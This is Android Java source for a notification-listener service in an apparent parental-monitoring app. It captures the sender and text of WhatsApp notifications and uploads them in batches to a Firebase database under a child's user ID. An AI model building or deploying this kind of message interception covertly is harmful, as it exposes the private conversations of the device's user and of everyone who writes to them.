package com.androidapp.guardian.services;

import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.androidapp.guardian.models.WhatsAppMessage;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;

public class NLService extends NotificationListenerService {

    private static final String WA_PACKAGE = "com.whatsapp";
    private final ArrayList<WhatsAppMessage> messages= new ArrayList();
    private FirebaseDatabase firebaseDatabase;
    private DatabaseReference databaseReference;
    private String uid;

    private final String TAG = this.getClass().getSimpleName();
    @Override
    public void onCreate() {
        super.onCreate();
        firebaseDatabase=FirebaseDatabase.getInstance("https://guardianapp-47975-default-rtdb.firebaseio.com/");
        databaseReference=firebaseDatabase.getReference("users");
        uid = FirebaseAuth.getInstance().getUid();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.e(TAG,">>>>> onNotificationPosted");

        if (sbn.getPackageName().equals(WA_PACKAGE)) {
            Notification notification = sbn.getNotification();
            Bundle bundle = notification.extras;

            String from = bundle.getString(NotificationCompat.EXTRA_TITLE,"");
            String message = bundle.getString(NotificationCompat.EXTRA_TEXT,"");

            Log.i(TAG, "From: " + from);
            Log.i(TAG, "Message: " + message);

            if(!from.isEmpty() && !message.isEmpty()){
                WhatsAppMessage whatsAppMessage=new WhatsAppMessage();
                whatsAppMessage.setMessage(message);
                whatsAppMessage.setFrom(from);
                whatsAppMessage.setType("0");
                messages.add(whatsAppMessage);
                if(messages.size()>=5){
                    sendDataToServer();
                }
            }

        }

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        Log.e(TAG,">>>>> onNotificationRemoved ");
    }


    @Override
    public void onListenerConnected() {
        Log.i(TAG, "Notification Listener connected");
    }

    public void sendDataToServer(){
        Log.e(TAG,">>>>> sendDataToServer +UID >>>>>"+uid);
        databaseReference.child("childs").child(uid).child("messages").setValue(messages);
    }

}
